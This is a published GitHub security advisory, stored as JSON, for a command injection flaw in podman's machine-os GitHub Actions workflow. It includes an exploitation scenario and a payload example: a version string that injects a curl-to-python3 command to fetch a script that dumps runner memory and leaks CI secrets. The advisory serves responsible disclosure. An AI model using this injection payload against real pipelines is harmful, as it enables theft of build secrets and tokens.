@@ -1,0 +1,117 @@
+{
+	"cvss": {},
+	"cwes": [
+		{
+			"cwe_id": "CWE-77",
+			"name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')"
+		}
+	],
+	"ghsa_id": "GHSA-34xh-hvp7-r2j7",
+	"summary": "Supply Chain vulnerability in containers/podman machine-os GitHub Actions workflow",
+	"description": "## Summary\r\n\r\nA vulnerable workflow in the containers/podman repository allows an unprivileged GitHub user to exfiltrate sensitive build-time secrets. The secretes have limited scope so they could not be used to push code directly.\r\nWe confirmed that this problem has NOT been exploited and it only effected the CI workflow and never actual podman code.\r\n\r\nThe problematic workflow was fixed in https://github.com/containers/podman/commit/d7fefb706439c9bda8a0684a8e98811856bf0504\r\n\r\n## Credits\r\n\r\nWe thank François Proulx, VP of Security Research at BoostSecurity.io, for responsibly reporting this vulnerability to us. \r\n\r\n\r\n## Exploitation Scenario\r\n\r\n1. An attacker opens a GitHub Pull Request targeting any release branch other than (`main`, `*-dev`, `*-rhel`) with a [malicious `version/rawversion/version.go` file](https://github.com/containers/podman/commit/21248dee3126b25f3b016af007be1756956b1839).\r\n2. The GitHub Actions workflow [`machine-os-pr.yml`](https://github.com/containers/podman/blob/400a9a528bfc33d23725958f379cb2bfecb4865e/.github/workflows/machine-os-pr.yml#L3-L6) is triggered on `pull_request_target`, which includes secrets and does not require approval.\r\n3. The version is retrieved from the `version.go` file without any sanitization, which allows any value in `steps.getversion.outputs.version` except a newline character ('\\n').\r\n4. This variable is then used **5 times** during the workflow, always using ${{ }} syntax, which allows for bash injection ([CWE-77](https://cwe.mitre.org/data/definitions/77.html)). The first occurrence can be found [here](https://github.com/containers/podman/blob/400a9a528bfc33d23725958f379cb2bfecb4865e/.github/workflows/machine-os-pr.yml#L76).\r\n5. The injection can be used to retrieve two secrets: \r\na. `PODMANBOT_TOKEN`: A Personal Access Token (PAT) used to push commits to another repo ([proof](https://github.com/podmanbot/podman-machine-os/commit/eedec01c8d345960c77898dc48789f2a74a3acd0)). The PAT at least has `content: write` permissions on `podmanbot/podman-machine-os`, which can be used to modify the repository and exfiltrate any secrets this repository holds. The PAT might have more rights depending on the creation parameters (TBD). \r\nb. `GITHUB_TOKEN`: with `issues: write` and `pull-requests: write` permissions. This could potentially aid social engineering, since labels (`approved`, `do-not-merge/\u003creason\u003e`, etc...) are heavily used in the PR review process within `containers/podman`. Currently, no workflows with higher permissions seem to use label conditions in a way that this token could exploit, but the potential exists.\r\n\r\nPayload example in `version.go`:\r\n\r\nThis is RCE stage 0 which dumps the memory of the GitHub Actions job runner, and outputs to logs the secrets double Base64 encode (raw secrets and base64 secrets is masked otherwise)\r\n\r\n```go\r\nconst RawVersion = \";curl -s https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/0cbe3f712837b97647fbd14a34c28d25b5bdacbf/ghamemdump.py | python3; exit 0\"\r\n```\r\n",
+	"severity": "medium",
+	"identifiers": [
+		{
+			"value": "GHSA-34xh-hvp7-r2j7",
+			"type": "GHSA"
+		}
+	],
+	"published_at": "2025-05-12T15:37:33Z",
+	"updated_at": "2025-05-12T15:37:33Z",
+	"vulnerabilities": [
+		{
+			"package": {
+				"ecosystem": "actions",
+				"name": "podman/.github/workflows/machine-os-pr.yml"
+			},
+			"vulnerable_version_range": "none",
+			"patched_versions": ""
+		}
+	],
+	"url": "https://api.github.com/repos/containers/podman/security-advisories/GHSA-34xh-hvp7-r2j7",
+	"html_url": "https://github.com/containers/podman/security/advisories/GHSA-34xh-hvp7-r2j7",
+	"publisher": {
+		"login": "Luap99",
+		"id": 45212748,
+		"node_id": "MDQ6VXNlcjQ1MjEyNzQ4",
+		"avatar_url": "https://avatars.githubusercontent.com/u/45212748?v=4",
+		"html_url": "https://github.com/Luap99",
+		"gravatar_id": "",
+		"type": "User",
+		"site_admin": false,
+		"url": "https://api.github.com/users/Luap99",
+		"events_url": "https://api.github.com/users/Luap99/events{/privacy}",
+		"following_url": "https://api.github.com/users/Luap99/following{/other_user}",
+		"followers_url": "https://api.github.com/users/Luap99/followers",
+		"gists_url": "https://api.github.com/users/Luap99/gists{/gist_id}",
+		"organizations_url": "https://api.github.com/users/Luap99/orgs",
+		"received_events_url": "https://api.github.com/users/Luap99/received_events",
+		"repos_url": "https://api.github.com/users/Luap99/repos",
+		"starred_url": "https://api.github.com/users/Luap99/starred{/owner}{/repo}",
+		"subscriptions_url": "https://api.github.com/users/Luap99/subscriptions"
+	},
+	"state": "published",
+	"cwe_ids": [
+		"CWE-77"
+	],
+	"credits": [
+		{
+			"login": "fproulx-boostsecurity",
+			"type": "reporter"
+		},
+		{
+			"login": "Talgarr",
+			"type": "reporter"
+		}
+	],
+	"credits_detailed": [
+		{
+			"user": {
+				"login": "fproulx-boostsecurity",
+				"id": 76956526,
+				"node_id": "MDQ6VXNlcjc2OTU2NTI2",
+				"avatar_url": "https://avatars.githubusercontent.com/u/76956526?v=4",
+				"html_url": "https://github.com/fproulx-boostsecurity",
+				"gravatar_id": "",
+				"type": "User",
+				"site_admin": false,
+				"url": "https://api.github.com/users/fproulx-boostsecurity",
+				"events_url": "https://api.github.com/users/fproulx-boostsecurity/events{/privacy}",
+				"following_url": "https://api.github.com/users/fproulx-boostsecurity/following{/other_user}",
+				"followers_url": "https://api.github.com/users/fproulx-boostsecurity/followers",
+				"gists_url": "https://api.github.com/users/fproulx-boostsecurity/gists{/gist_id}",
+				"organizations_url": "https://api.github.com/users/fproulx-boostsecurity/orgs",
+				"received_events_url": "https://api.github.com/users/fproulx-boostsecurity/received_events",
+				"repos_url": "https://api.github.com/users/fproulx-boostsecurity/repos",
+				"starred_url": "https://api.github.com/users/fproulx-boostsecurity/starred{/owner}{/repo}",
+				"subscriptions_url": "https://api.github.com/users/fproulx-boostsecurity/subscriptions"
+			},
+			"type": "reporter",
+			"state": "accepted"
+		},
+		{
+			"user": {
+				"login": "Talgarr",
+				"id": 71460041,
+				"node_id": "MDQ6VXNlcjcxNDYwMDQx",
+				"avatar_url": "https://avatars.githubusercontent.com/u/71460041?v=4",
+				"html_url": "https://github.com/Talgarr",
+				"gravatar_id": "",
+				"type": "User",
+				"site_admin": false,
+				"url": "https://api.github.com/users/Talgarr",
+				"events_url": "https://api.github.com/users/Talgarr/events{/privacy}",
+				"following_url": "https://api.github.com/users/Talgarr/following{/other_user}",
+				"followers_url": "https://api.github.com/users/Talgarr/followers",
+				"gists_url": "https://api.github.com/users/Talgarr/gists{/gist_id}",
+				"organizations_url": "https://api.github.com/users/Talgarr/orgs",
+				"received_events_url": "https://api.github.com/users/Talgarr/received_events",
+				"repos_url": "https://api.github.com/users/Talgarr/repos",
+				"starred_url": "https://api.github.com/users/Talgarr/starred{/owner}{/repo}",
+				"subscriptions_url": "https://api.github.com/users/Talgarr/subscriptions"
+			},
+			"type": "reporter",
+			"state": "accepted"
+		}
+	]
+}
